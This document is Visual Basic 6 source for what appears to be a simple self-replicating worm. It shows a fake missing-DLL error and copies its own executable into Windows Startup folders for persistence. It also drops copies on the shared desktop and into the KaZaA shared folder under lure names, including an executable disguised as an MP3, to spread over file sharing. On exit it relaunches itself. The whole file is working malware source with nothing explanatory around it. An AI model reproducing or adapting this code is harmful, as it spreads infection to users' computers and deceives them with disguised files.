Private Sub Form_Unload(Cancel As Integer)
  Shell App.Path & "\" & App.EXEName & ".exe"
  Open "C:\file.sys" For Output As #1
  End Sub
Private Sub Form_load()
   On Error Resume Next
   MsgBox "you dont need to emerge from nothing. Essential File missing Hotdogs32.dll"
   FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\BrainwashBrainwashBrainwash45.exe"
   FileCopy App.Path + "\" & App.EXEName + ".exe", "C:\Windows\Start Menu\Programs\Startup\1q2w3e4r5t.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\SWEV-SWEV.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\this-is-something-or-nothing.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "C:\Program Files\KaZaA\My shared folder\The White Stripes - IM INFECTED.mp3"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\sdkgero.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\burger.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\makingadifferencedaily.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\wibblewobbleyumyum.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\feeding_frenzy.exe"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\onitsway.VBS"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Desktop\BRAINWASH,BRAINWASH,BRAINWASH45.JPG"
End Sub